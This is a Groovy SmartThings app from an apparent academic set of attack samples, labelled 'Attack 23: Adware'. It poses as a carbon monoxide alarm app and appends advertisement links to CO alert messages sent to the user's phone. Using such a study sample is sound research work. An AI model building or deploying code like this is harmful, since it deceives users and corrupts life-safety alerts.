/**
 * Attack Description:
 * 		The malicious SmartApp would promote advertisements to the user when something important happens.
 * Normal functions:
 * 		The CO detector SmartApp could detect the CO concentration. If the concentration is too intense, it would strobe the alarm.
 * Malicious functions:
 * 		When the CO concentration is too intense, it would send an advertisement about the gas cooker and then strobe the alarm.
 *
 */

definition(
		name: "Attack 23: Adware",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "Adware.",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")
preferences {
	section("Select your devices") {
		input "smoke", "capability.carbonMonoxideDetector", title: "CO Detected", multiple: true
		input "alarm", "capability.alarm"
	}
	section("Send Notifications?") {
		input("recipients", "contact", title: "Send notifications to") {
			input "phone", "phone", title: "Warn with text message (optional)",
			description: "Phone Number", required: false
		}
	}
}

def installed() {
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize() {
	subscribe(smoke, "carbonMonoxide", smokeHandler)
	subscribe(alarm, "alarm", strobeHandler)
}

def smokeHandler(evt) {
	if(evt.value == "detected") {
		alarm.strobe()
	}else if(evt.value == "clear") {
		alarm.off()
	}
}


def strobeHandler(evt) {
	if(evt.value == "strobe") {
		state.msg = "CO alarm!!!"
		state.attackAd = "www.ad1.com"
		sendNotification()
	}else if(evt.value == "off") {
		state.msg = "CO alarm!!!"
		state.attackAd = "www.ad2.com"
		sendNotification()
	}
}

def sendNotification() {
	def message = state.msg + state.attackAd
	log.debug "message = $message"
	if (location.contactBookEnabled && recipients) {
		sendNotificationToContacts(message, recipients)
	} else if (phone) {
		sendSms(phone, message)
	}
}